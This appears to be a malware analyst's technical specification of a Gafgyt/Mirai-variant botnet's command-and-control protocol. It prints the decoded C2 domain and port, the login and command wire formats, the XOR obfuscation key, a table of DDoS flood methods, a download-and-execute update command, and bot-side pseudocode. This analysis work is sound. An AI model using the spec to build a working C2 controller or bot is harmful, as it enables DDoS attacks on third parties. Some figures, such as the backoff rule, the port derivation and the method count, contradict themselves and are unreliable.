# Gafgyt/Mirai Botnet — Communication Layer Technical Specification

## Binary Identity
- **SHA-256**: `021e1c202a1d8defd3752ab749e50dac53645e40fa09d50aea9fa8004f48ba27`
- **Architecture**: x86-64, ELF, statically linked, stripped
- **Family**: Gafgyt (Qbot) / Mirai variant

---

# 1. Session Establishment

## 1.1 Observed Behavior

The bot establishes a TCP connection to the C2 server and immediately transmits an authentication/login payload. No server challenge or cryptographic handshake occurs — the protocol is one-shot: the bot sends credentials and expects the server to accept the connection and begin sending commands.

### Step-by-step flow:

1. **Socket creation**: A TCP socket (`AF_INET`, `SOCK_STREAM`) is created with `sys_socket(2, 1, 0)`.
2. **Non-blocking mode**: The socket is set to non-blocking via `fcntl(F_SETFL, O_NONBLOCK)`.
3. **Send/receive timeouts**: 10-second timeouts are set via `setsockopt(SO_SNDTIMEO, 10s)` and `setsockopt(SO_RCVTIMEO, 10s)`.
4. **DNS resolution**: The C2 domain name is resolved to an IP address via a custom DNS resolver (`c2_resolve` → `dns_resolve`). The domain is stored in the XOR-encrypted string table.
5. **Connect**: `sys_connect()` is called to the resolved IP + port. Because the socket is non-blocking, the connection is asynchronous.
6. **Connection success detection**: The `select()` loop monitors the socket's writeability. When the socket becomes writable, `getsockopt(SO_ERROR)` is checked for error code 0 to confirm successful connection.
7. **Login transmission**: Upon connection success, the bot immediately sends the authentication payload (see §1.2).
8. **Command reception**: After authentication, the bot enters the command receive loop, waiting for C2 messages.

### Failure handling:

- **DNS failure**: If `dns_resolve` returns NULL, `c2_resolve` returns without updating the C2 address structure. The connection attempt uses stale/default values and fails.
- **Connection failure**: If `getsockopt(SO_ERROR)` returns non-zero, the socket is closed and reconnection is attempted after an exponential backoff delay (initial 60 seconds, doubled each failure, capped at 60 seconds minimum — effectively `backoff = min(60, prev_backoff * 2)`).
- **Connection timeout**: The 10-second `select()` timeout triggers reconnection.

## 1.2 Handshake Protocol — Login Payload

### Wire format (sent immediately after TCP connect):

```
Offset  Size  Field            Value / Description
------  ----  ---------------- -----------------------------------------------
0       4     Magic Header     0x00 0x00 0x00 0x01  (big-endian uint32 = 1)
4       1     Password Length  N  (0–31 bytes, 0 = no password)
5       N     Password         argv[1] from command line (optional)
5+N     1     Auth Byte        0x42  (first byte of table entry 3, 'B')
```

### Total minimum size: 6 bytes (no password)
### Total maximum size: 37 bytes (with 31-byte password)

### Field details:

**Magic Header (4 bytes)**: Fixed value `\x00\x00\x00\x01`. Stored in `.rodata` at address `0x00419e80`. This is a protocol version or message type identifier.

**Password Length (1 byte)**: Length of the password string. Extracted from `argv[1]` (the first command-line argument passed to the bot binary). The bot validates:
- `argc == 2` (exactly one argument)
- `strlen(argv[1]) < 32` (maximum 31 characters)
If validation passes, the password is copied into a 32-byte stack buffer (`c2_password_buf`) and `argv[1]` is zeroed out for cleanup.

**Password (N bytes)**: The actual password string from the command line. If no argument was provided, this field is omitted (length byte = 0).

**Auth Byte (1 byte)**: Fixed value `0x42` (ASCII 'B'). This is the first byte of the decrypted string table entry 3, which contains the plaintext string `"Bruh why again"`. The bot:
1. Unlocks (decrypts) table entry 3 via `table_unlock_val(3)`
2. Retrieves a pointer to the decrypted data via `table_retrieve_val(3, NULL)`
3. Sends exactly 1 byte (the first byte `0x42`) to the server
4. Re-locks (re-encrypts) the table entry via `table_lock_val(3)`

### Pseudocode — Login Transmission:

```
function send_login(socket_fd, argv_password):
    # Step 1: Send 4-byte magic header
    header = [0x00, 0x00, 0x00, 0x01]   # uint32 big-endian = 1
    send(socket_fd, header, 4, MSG_NOSIGNAL)

    # Step 2: Send password length
    if argv_password is not None and len(argv_password) < 32:
        password = argv_password
        password_len = len(password)
    else:
        password = ""
        password_len = 0
    
    send(socket_fd, [password_len], 1, MSG_NOSIGNAL)

    # Step 3: Send password (if present)
    if password_len > 0:
        send(socket_fd, password, password_len, MSG_NOSIGNAL)

    # Step 4: Send auth byte (first byte of table entry 3)
    # table entry 3 decrypts to "Bruh why again"
    auth_byte = table_retrieve_val(3)  # returns pointer to "Bruh why again"
    send(socket_fd, auth_byte, 1, MSG_NOSIGNAL)
```

## 1.3 Server Response / Session Acceptance

### Verified Fact: The bot does NOT wait for or validate any server response to the login payload.

After sending the login payload, the bot immediately returns to the `select()` loop and begins waiting for incoming C2 commands. There is no server challenge, no response validation, and no acknowledgment expected.

### Session acceptance criteria:
- **Implicit acceptance**: The server simply begins sending commands. If the server disconnects or sends no data, the bot detects the closed socket (recv returns 0) and initiates reconnection.
- **No explicit rejection handling**: The bot does not parse any "login failed" response. Any data received on the socket after login is treated as a command.

## 1.4 C2 Server Configuration

| Parameter | Value | Source |
|-----------|-------|--------|
| Domain | `osfjkqoiw382r552q.hopto.org` | Table entry 0 (28 bytes) |
| Port | `13056` (0x3300) | Table entry 2 (2 bytes, stored as uint16) |
| Auth token | `"Bruh why again"` (first byte `0x42` sent) | Table entry 3 (15 bytes) |

### Domain resolution:
- The domain is resolved via a custom DNS resolver (`dns_resolve`) that sends raw DNS queries to the system's configured DNS server (read from `/etc/resolv.conf`).
- If multiple A records are returned, one is selected randomly: `ip_index = rand_next() % record_count`.
- Resolution is attempted fresh on each connection attempt.

### Port derivation:
- The port is stored as 2 bytes in table entry 2.
- Encrypted bytes: `[0x11, 0x22]`
- After XOR decryption: `[0x33, 0x00]`
- Read as uint16 (little-endian): `0x0033` = 51
- Stored to `sockaddr_in.sin_port` as raw uint16
- Network byte order interpretation: `0x3300` = **13056**

---

# 2. Cryptography

## 2.1 Observed Behavior

The binary uses a single, simple XOR-based obfuscation mechanism applied exclusively to the string table. There is **no encryption** applied to network traffic. C2 commands are transmitted and processed in **plaintext** with no cryptographic encoding.

The XOR obfuscation is used only to hide static strings within the binary (domain names, file paths, command strings, HTTP headers). These strings are decrypted at runtime before use and re-encrypted afterward.

## 2.2 Specification

### Algorithm: Multi-byte XOR (static key)

| Parameter | Value |
|-----------|-------|
| Algorithm | XOR with 4-byte key applied sequentially |
| Key (raw) | `0xDEADBEEF` |
| Key bytes (little-endian) | `[0xEF, 0xBE, 0xAD, 0xDE]` |
| Effective XOR per byte | `0xEF ^ 0xBE ^ 0xAD ^ 0xDE` = **`0x22`** |
| Key storage | Global variable at `DAT_0051c48c` |

### XOR operation (per byte):
```
for each byte b in data:
    b = b ^ 0xEF
    b = b ^ 0xBE
    b = b ^ 0xAD
    b = b ^ 0xDE
```
This is equivalent to:
```
for each byte b in data:
    b = b ^ 0x22
```

### Implementation:

```c
// The XOR key (stored at 0x0051c48c)
uint32_t xor_key = 0xDEADBEEF;  // ef be ad de in memory

void table_unlock_val(uint8_t index) {
    // Decrypt a table entry in-place
    uint8_t* data = table[index].pointer;
    uint16_t length = table[index].length;
    
    for (int i = 0; i < length; i++) {
        data[i] ^= (xor_key & 0xFF);         // ^ 0xEF
        data[i] ^= ((xor_key >> 8) & 0xFF);  // ^ 0xBE
        data[i] ^= ((xor_key >> 16) & 0xFF); // ^ 0xAD
        data[i] ^= ((xor_key >> 24) & 0xFF); // ^ 0xDE
    }
}

void table_lock_val(uint8_t index) {
    // Re-encrypt a table entry (same operation, XOR is self-inverse)
    table_unlock_val(index);
}
```

### String Table Structure:

The string table is an array of entries at `0x0051eac0`, each occupying 16 bytes:

```
Offset  Size  Field
------  ----  -----------------------
0       8     Pointer to string data (heap-allocated)
8       2     Length of string data (uint16)
10      6     Padding/unused
```

### Key Decrypted Strings:

| Index | Decrypted Value | Purpose |
|-------|-----------------|---------|
| 0 | `osfjkqoiw382r552q.hopto.org` | C2 domain name |
| 1 | `\x00E` | Banner (2 bytes written to stdout) |
| 2 | `3\x00` | C2 port (2 bytes, uint16) |
| 3 | `Bruh why again\x00` | Auth token (first byte sent) |
| 4 | `/proc/` | Process directory path |
| 5 | `/exe` | Executable path suffix |
| 9 | `/proc/net/tcp` | Connection table path |
| 13 | `qtxbot` | Process name |
| 31 | `/etc/resolv.conf` | DNS resolver config |
| 33–41 | Watchdog device paths | Watchdog device files |
| 50 | `/proc/net/route` | Routing table path |
| 51 | `/proc/cpuinfo` | CPU info path |
| 52 | `BOGOMIPS` | CPU detection string |
| 59 | `PRIVMSG` | IRC command |
| 60 | `GETLOCALIP` | Local IP command |
| 61 | `KILLATTK` | Kill attack command |
| 70 | `Connection: keep-alive` | HTTP header |
| 79 | `server: dosarrest` | HTTP header |
| 81 | `server: cloudflare-nginx` | HTTP header |
| 83–89 | HTTP User-Agent strings | Browser impersonation |

## 2.3 Handshake vs Runtime Crypto

**No difference.** The XOR string table decryption is the only cryptographic operation in the binary. It is used identically during both handshake preparation (to retrieve the auth token) and during normal operation (to retrieve paths, HTTP headers, etc.). Network traffic is **unencrypted**.

---

# 3. Main Command Loop

## 3.1 Observed Behavior

After authentication, the bot enters a `select()`-based event loop that handles three event types:

1. **C2 socket readability** → Receive and process commands
2. **C2 socket writeability** → Connection establishment completion
3. **Select timeout (10 seconds)** → Heartbeat transmission

### Loop structure:

```
while True:
    FD_ZERO(read_fds)
    FD_ZERO(write_fds)
    
    if ctrl_fd != -1:
        FD_SET(ctrl_fd, read_fds)      # Single-instance control socket
    
    if c2_fd == -1:
        c2_fd = socket(AF_INET, SOCK_STREAM, 0)
        setsockopt(c2_fd, SO_SNDTIMEO, 10s)
        setsockopt(c2_fd, SO_RCVTIMEO, 10s)
        fcntl(c2_fd, F_SETFL, O_NONBLOCK)
        c2_resolve()                     # Resolve domain -> IP + port
        connecting = True
        connect(c2_fd, &c2_addr, 16)
    
    if connecting:
        FD_SET(c2_fd, write_fds)         # Monitor for connect completion
    else:
        FD_SET(c2_fd, read_fds)          # Monitor for incoming data
    
    result = select(max_fd + 1, &read_fds, &write_fds, NULL, &timeout_10s)
    
    if result == -1:
        continue  # EINTR/error
    
    if result == 0:  # Timeout
        heartbeat_counter++
        if heartbeat_counter % 4 == 0:  # Every 4th timeout (~40s)
            send(c2_fd, [0x00, 0x00], 2, MSG_NOSIGNAL)  # Heartbeat ping
    
    # Check control socket (single-instance)
    if ctrl_fd readable:
        kill(-session_id, SIGKILL)       # Kill entire process group
        exit(0)
    
    # Check C2 socket
    if connecting and c2_fd in write_fds:
        # Connection completed
        err = 0
        getsockopt(c2_fd, SOL_SOCKET, SO_ERROR, &err, &optlen)
        if err == 0:
            send_login(c2_fd, password)  # Send authentication
            connecting = False
        else:
            close(c2_fd)
            c2_fd = -1
            sleep(backoff_delay)
    
    if not connecting and c2_fd in read_fds:
        process_commands(c2_fd)
```

## 3.2 Protocol Specification — Wire Format

### Message Framing:

All C2 messages use a **length-prefixed framing** with 2-byte big-endian length headers:

```
All messages:
  [2 bytes: length N (big-endian uint16)]
  [N bytes: payload]

Maximum payload size: 1024 bytes (0x400)
```

### Command Reception Sequence:

The bot reads commands in a specific pattern. Each receive cycle processes exactly **one command** from the server:

```
Step 1: Read 2-byte length prefix
    If length == 0:
        # Heartbeat from server
        Read 2 more bytes (discard)
        Return to select loop
    
    If length > 1024:
        Close connection (protocol violation)
        Return to select loop
    
Step 2: Read N bytes of payload into recv_buf (discarded)
Step 3: Read 2-byte length prefix for actual command
Step 4: Read M bytes into recv_buf (overwrites step 2)
Step 5: If M > 0: call attack_parse(recv_buf, M)
```

The first payload (Step 2) is always discarded. Only the second payload (Step 4) is processed. This is a deliberate framing mechanism — possibly to consume a "dummy" packet or as a simple anti-analysis measure.

### Command Payload Format:

The command payload (processed by `attack_parse`) has the following structure:

```
Offset  Size  Field           Description
------  ----  --------------- --------------------------------------------
0       4     Target IP       IPv4 address (big-endian uint32)
4       1     Command ID      Attack method selector / special command
5       1     Target Count    Number of target entries (T)
6       T*5   Target Entries  Each entry: [4 bytes IP] [1 byte CIDR mask]
6+T*5   1     Option Count    Number of option entries (O)
7+T*5   1     First Option ID Option identifier byte
        ...   Options...      Variable-length option entries
```

### Special Command IDs:

| ID (signed byte) | Behavior |
|------------------|----------|
| `-1` (0xFF) | **KILL**: Stop all running attacks. If `DAT_0051c9a0` (current attack supervisor PID) is non-zero, sends `SIGKILL` to it. Resets supervisor PID to 0. |
| `-2` (0xFE) | **UPDATE/EXEC**: Download and execute a new binary. The payload after offset 5 is treated as a URL/path string passed to `util_download_exec()`. |

### Attack Command Format (ID >= 0):

```
Offset  Size  Field               Description
------  ----  ------------------- -----------------------------------------
0       4     Target IP           IPv4 address (big-endian uint32)
4       1     Command ID          Attack method ID (0x00–0x2A)
5       1     Target Count (T)    Number of targets (must be > 0)
6       T*5   Target Entries      Each: [4 bytes IP][1 byte CIDR]
6+T*5   1     Option Count (O)    Number of option entries
        ...   Options...          Variable-length option data
```

### Target Entry Format:

Each target entry is 5 bytes:

```
Offset  Size  Field     Description
------  ----  -----------------------------------------
0       4     IP        IPv4 address (big-endian uint32)
4       1     CIDR      Subnet mask in CIDR notation (e.g., 32 for single host)
```

These are expanded into a 24-byte `struct target` internally:

```c
struct target {
    struct sockaddr addr;  // 16 bytes (contains IP at offset 4)
    uint32_t netmask;      // 4 bytes
    uint8_t cidr;          // 1 byte
};
```

### Option Entry Format:

Options are variable-length. The option section begins with a count byte:

```
[1 byte: Option Count (O)]
[1 byte: First Option ID]
[1 byte: First Option Value Length (L)]
[L bytes: First Option Value]
[1 byte: Second Option ID]
[1 byte: Second Option Value Length (L2)]
[L2 bytes: Second Option Value]
...
```

Each option entry is stored internally as:

```c
struct option {
    char *val;   // 8 bytes - pointer to option string value
    uint8_t id;  // 1 byte - option identifier
};
```

### Attack Method Dispatch:

The `attack_start` function dispatches attacks by iterating through the global attack table (populated by `attack_init`). The table maps method IDs to function pointers:

```
attack_start(target_ip_be, command_id, target_count, targets, option_count, options):
    supervisor_pid = fork()
    
    if supervisor_pid > 0:
        # Parent (daemon): store PID, return to select loop
        if current_attack_pid == 0:
            current_attack_pid = supervisor_pid
        return
    
    if supervisor_pid == 0:
        # Child (attack supervisor)
        timer_pid = fork()
        
        if timer_pid == 0:
            # Grandchild (timer)
            sleep(duration_in_seconds)
            kill(getppid(), SIGKILL)  # Kill supervisor after duration
            exit(0)
        
        # Lookup method by ID
        for i in range(attack_count):
            if attack_table[i].method_id == command_id:
                attack_table[i].function(targets, options)
                break
        
        exit(0)
```

### Attack Duration:

The duration is embedded in the target IP field (first 4 bytes of the command). The IP value is byte-swapped and used as the duration in seconds:

```c
duration = byte_swap(target_ip);  // Convert from big-endian to host order
```

## 3.3 Attack Method Table

The following method IDs are registered by `attack_init`:

| ID (hex) | Function | Attack Type |
|----------|----------|-------------|
| 0x00 | `attack_tcp_stomp` | TCP STOMP flood |
| 0x01 | `attack_udp_plain` | UDP plain flood |
| 0x02 | `attack_udp_std` | UDP standard flood |
| 0x03 | `attack_tcp_generic` | TCP generic flood |
| 0x04 | `attack_tcp_ack` | TCP ACK flood |
| 0x05 | `attack_tcp_syn` | TCP SYN flood |
| 0x06 | `attack_udp_hexflood` | UDP hex flood |
| 0x07 | `attack_udp_stdhex` | UDP standard hex flood |
| 0x08 | `attack_udp_nudp` | UDP NUDP flood |
| 0x09 | `attack_udp_udphex` | UDP hex flood |
| 0x0A | `attack_tcp_xmas` | TCP XMAS flood |
| 0x0B | `attack_gre_ip` (LAB_00406590) | GRE IP flood |
| 0x0C | `attack_gre_ip` | GRE IP flood (duplicate) |
| 0x0D | `attack_udp_dns` | UDP DNS amplification |
| 0x0E | `attack_udp_ovh0e` | OVH bypass (variant) |
| 0x0F | `attack_udp_ovh0f` | OVH bypass (variant) |
| 0x10 | `attack_udp_std10` | UDP std variant |
| 0x11 | `attack_udp_std11` | UDP std variant |
| 0x12 | `attack_tcp_conn12` | TCP connection flood |
| 0x13 | `attack_udp_std13` | UDP std variant |
| 0x14 | `attack_udp_std14` | UDP std variant |
| 0x15 | `attack_udp_std15` | UDP std variant |
| 0x16 | `attack_udp_std16` | UDP std variant |
| 0x17 | `attack_tcp_bypass` | TCP bypass flood |
| 0x18 | `attack_ip_raw` | Raw IP flood |
| 0x19 | `attack_udp_custom` | Custom UDP flood |
| 0x1A | `attack_udp_ovhdrop` | OVH drop flood |
| 0x1B | `attack_udp_nfo` | NFO flood |
| 0x1C | `attack_udp_std1c` | UDP std variant |
| 0x1D | `attack_udp_std1d` | UDP std variant |
| 0x1E | `attack_udp_std1e` | UDP std variant |
| 0x1F | `attack_udp_std1f` | UDP std variant |
| 0x20 | `attack_udp_ovh` | OVH bypass |
| 0x21 | `attack_udp_std21` | UDP std variant |
| 0x22 | `attack_udp_std22` | UDP std variant |
| 0x26 | `attack_udp_std26` | UDP std variant |
| 0x28 | `attack_udp_std28` | UDP std variant |
| 0x2A | `attack_udp_std2a` | UDP std variant |

### Dynamic Registration:

**Verified Fact: No dynamic command/attack registration at runtime.** The attack method table is populated once during `attack_init()` (called from `main` before daemonization and again after fork). All 36 attack methods are hardcoded. There is no mechanism for the C2 to register new methods or modify the dispatch table at runtime.

## 3.4 Pseudocode — Command Processing

```
function process_commands(socket_fd):
    # Step 1: Read 2-byte length prefix
    errno = 0
    raw_len = recv(socket_fd, len_buf, 2, MSG_NOSIGNAL)
    
    if raw_len == -1:
        if errno == EAGAIN or errno == EINTR:
            return  # Try again later
        else:
            disconnect_and_reconnect()
            return
    
    if raw_len == 0:
        disconnect_and_reconnect()  # Server closed connection
        return
    
    # Step 2: Check for heartbeat (length == 0)
    length = big_endian_to_uint16(len_buf)
    if length == 0:
        recv(socket_fd, discard_buf, 2, MSG_NOSIGNAL)  # Discard
        return  # Heartbeat received, no command
    
    # Step 3: Validate length
    if length > 1024:
        close(socket_fd)
        socket_fd = -1
        return  # Protocol violation
    
    # Step 4: Read first payload (discarded)
    recv(socket_fd, recv_buf, length, MSG_NOSIGNAL)
    
    # Step 5: Read second length prefix (actual command)
    recv(socket_fd, len_buf, 2, MSG_NOSIGNAL)
    cmd_length = big_endian_to_uint16(len_buf)
    
    # Step 6: Read second payload (actual command)
    recv(socket_fd, recv_buf, cmd_length, MSG_NOSIGNAL)
    
    # Step 7: Process command
    if cmd_length > 0:
        attack_parse(recv_buf, cmd_length)

function attack_parse(payload, length):
    if length < 4:
        return  # Too short
    
    target_ip = payload[0:4]       # First 4 bytes = target IP / duration
    command_id = payload[4]        # Byte 4 = command ID
    
    if length == 4:
        return  # Only IP, no command
    
    # Handle special commands
    if command_id == 0xFF:  # -1 signed = KILL
        if current_attack_pid != 0:
            kill(current_attack_pid, SIGKILL)
        current_attack_pid = 0
        return
    
    if command_id == 0xFE:  # -2 signed = UPDATE
        url = payload[5:length]  # Rest of payload is URL
        util_download_exec(url)
        return
    
    if length == 5:
        return  # No targets
    
    # Parse targets
    target_count = payload[5]  # Byte 5
    if target_count == 0:
        return
    
    remaining = length - 6
    if remaining < target_count * 5:
        return  # Not enough data
    
    targets = calloc(target_count, sizeof(struct target))
    offset = 6
    for i in range(target_count):
        targets[i].addr = payload[offset:offset+4]  # IP
        targets[i].cidr = payload[offset+4]          # CIDR
        offset += 5
    
    # Parse options
    if remaining == target_count * 5:
        # No options
        attack_start(target_ip, command_id, target_count, targets, 0, NULL)
        free(targets)
        return
    
    option_count = payload[offset]
    offset += 1
    
    if option_count == 0:
        attack_start(target_ip, command_id, target_count, targets, 0, NULL)
        free(targets)
        return
    
    if remaining - (target_count * 5) - 1 < 2:
        attack_start(target_ip, command_id, target_count, targets, 0, NULL)
        free(targets)
        return
    
    options = calloc(option_count, sizeof(struct option))
    option_id = payload[offset]
    offset += 1
    
    for i in range(option_count):
        value_len = payload[offset]
        offset += 1
        if remaining - offset < value_len:
            break
        options[i].val = malloc(value_len + 1)
        memcpy(options[i].val, payload[offset:offset+value_len], value_len)
        options[i].val[value_len] = '\0'
        options[i].id = option_id
        offset += value_len
        
        if i < option_count - 1:
            if offset >= remaining:
                break
            option_id = payload[offset]
            offset += 1
    
    attack_start(target_ip, command_id, target_count, targets, option_count, options)
    
    # Cleanup
    free(targets)
    for i in range(option_count):
        if options[i].val != NULL:
            free(options[i].val)
    free(options)
```

---

# 4. ACKs & Keepalives

## 4.1 Observed Behavior

The bot has a minimal feedback mechanism. It does **not** send explicit acknowledgments for received commands, execution results, or status updates to the C2. The only outbound traffic from the bot (after the initial login) is:

1. **Heartbeat pings**: Periodic 2-byte zero-value packets
2. **Attack traffic**: DDoS flood packets (not part of C2 protocol)

## 4.2 Heartbeat / Keepalive

### Heartbeat format:

```
Size: 2 bytes
Value: 0x0000 (uint16, little-endian)
```

### Transmission logic:

The heartbeat is tied to the `select()` timeout. The `select()` call uses a 10-second timeout. A counter (`heartbeat_counter` / `R12D` in the assembly, `uVar3` in the decompilation) is incremented on each timeout.

```
heartbeat_counter = 0
while True:
    result = select(..., timeout=10s)
    
    if result == 0:  # Timeout
        heartbeat_counter++
        
        if heartbeat_counter % 4 == 0:
            # Send 2-byte zero heartbeat
            send(c2_fd, [0x00, 0x00], 2, MSG_NOSIGNAL)
```

### Timing:

- **Interval**: Every 4th select timeout = approximately **40 seconds** (4 × 10s)
- **Initial delay**: First heartbeat sent after ~40 seconds of inactivity
- **On send failure**: If `send()` returns -1, the socket is closed and reconnection is initiated after a 1-second sleep

### Server heartbeat handling:

When the bot receives a 2-byte length prefix of `0x0000` from the server, it interprets this as a server heartbeat. It reads and discards the next 2 bytes and returns to the select loop without processing any command.

## 4.3 Status Reporting

**Verified Fact: No status reporting is implemented.** The bot does not transmit any telemetry, execution results, error reports, or victim information back to the C2 beyond the initial login payload. There is no mechanism for:

- Command execution acknowledgment
- Attack completion notification
- Error reporting
- Bot health/status updates
- Victim/target information exfiltration

## 4.4 Session Lifecycle

### Session states:

```
State          Description
------         ----------------------------------------------------------
DISCONNECTED   c2_fd == -1. Bot creates new socket and initiates connect.
CONNECTING     Socket created, non-blocking connect in progress.
               c2_fd != -1, connecting flag = true.
AUTHENTICATED  Login payload sent, awaiting commands.
               c2_fd != -1, connecting flag = false.
```

### State transitions:

```
DISCONNECTED → CONNECTING: On select loop iteration when c2_fd == -1
CONNECTING → AUTHENTICATED: Socket becomes writable, SO_ERROR == 0
CONNECTING → DISCONNECTED: Socket error, close + backoff + reconnect
AUTHENTICATED → DISCONNECTED: recv returns 0, or recv/send error
```

### Reconnection behavior:

- **Immediate reconnect**: When `c2_fd` is set to -1, the next loop iteration creates a new socket and initiates connection.
- **Backoff delay**: On connection failure, an exponential backoff is applied:
  ```c
  // Initial: 60 seconds
  // On failure: backoff = min(60, previous_backoff * 2)
  // Capped at 60 seconds minimum
  if (previous_backoff * 2 < 60) {
      backoff = previous_backoff * 2;
  } else {
      backoff = 60;
  }
  sleep(backoff);
  ```
- **On send failure**: 1-second sleep before reconnect.

### Graceful termination:

The bot terminates itself (entire process group) when:
1. The single-instance control socket (`c2_fd` bound to `127.0.0.1:17664` / `0x4500`) receives a connection. This signals another instance is running.
2. On receiving this signal: `kill(-session_id, SIGKILL)` kills the daemon process group, then `exit(0)`.

### Session identifiers:

- **No sequence numbers**: There are no message IDs, sequence numbers, or session tokens in the protocol.
- **No session resumption**: Each connection is independent. Reconnection re-authenticates from scratch.

## 4.5 Pseudocode — Feedback and Session Management

```
function handle_select_timeout():
    heartbeat_counter++
    
    # Every 4th timeout (~40s), send heartbeat
    if heartbeat_counter % 4 == 0:
        ping = [0x00, 0x00]
        result = send(c2_fd, ping, 2, MSG_NOSIGNAL)
        if result == -1:
            # Send failed, reconnect
            close(c2_fd)
            c2_fd = -1
            sleep(1)

function handle_connection_failure():
    close(c2_fd)
    c2_fd = -1
    close(-1)  # No-op cleanup
    c2_fd = -1
    
    # Exponential backoff (capped at 60s)
    backoff = min(60, previous_backoff * 2)
    if backoff < 60:
        previous_backoff = backoff
    else:
        previous_backoff = 60
    sleep(backoff)

function handle_server_disconnect():
    if c2_fd != -1:
        close(c2_fd)
    c2_fd = -1
    sleep(1)
    # Next loop iteration will reconnect
```

---

# Analysis Gaps

| Gap | Reason |
|-----|--------|
| **Exact C2 port** | The port value `0x3300` (13056) is derived from XOR-decrypted table entry 2. The decrypted bytes `[0x33, 0x00]` are stored as a raw uint16 to the `sockaddr_in.sin_port` field. The interpretation depends on whether the stored value is in host or network byte order. The initial port value `0x5000` (which corresponds to port 80) confirms the storage convention. Port 13056 is unverified against live C2 infrastructure. |
| **Server-side protocol** | The C2 server implementation is not present in this binary. Server-side validation logic, command generation, and any server-initiated handshake responses cannot be determined. |
| **First payload purpose** | The protocol reads two consecutive payloads but only processes the second. The first payload's purpose is unclear — it may be a server-side keepalive, a dummy padding packet, or an anti-analysis artifact of the server implementation. |
| **Heartbeat response** | When the bot receives a 2-byte zero-length prefix from the server (server heartbeat), it reads and discards 2 additional bytes. The format and purpose of these bytes are unknown. |
| **Update mechanism** | The `-2` (0xFE) command triggers `util_download_exec()` with the URL from the payload. The download and execution mechanism (protocol, binary format, execution method) is outside the communication layer scope. |
| **Exact option semantics** | The option IDs and their associated value semantics (port, duration, packet size, flags, etc.) are defined per attack function. The `attack_parse` function only extracts and passes them as opaque string values. Their interpretation is attack-specific and not documented here. |

---

# Summary of Protocol Constants

| Constant | Value | Notes |
|----------|-------|-------|
| C2 Domain | `osfjkqoiw382r552q.hopto.org` | Table entry 0 |
| C2 Port | 13056 (0x3300) | Table entry 2 |
| Auth Token | `"Bruh why again"` (first byte `0x42` sent) | Table entry 3 |
| Login Header | `\x00\x00\x00\x01` | 4-byte magic |
| Max Password Length | 31 bytes | argv[1] validation |
| Max Payload Size | 1024 bytes | Protocol limit |
| Select Timeout | 10 seconds | select() timeout |
| Heartbeat Interval | ~40 seconds | Every 4th timeout |
| Heartbeat Payload | `\x00\x00` | 2 zero bytes |
| XOR Key | 0xDEADBEEF | String obfuscation |
| Effective XOR | 0x22 per byte | After combining key bytes |
| Reconnect Backoff | 60s min, doubled each failure | Exponential backoff |
| Single-instance Port | 17664 (0x4500) | Bind to 127.0.0.1 |
| Control Socket Family | AF_INET (2) | Socket domain |
| C2 Socket Type | SOCK_STREAM (1) | TCP |
| Send/Recv Flags | 0x4000 (MSG_NOSIGNAL) | Prevent SIGPIPE |
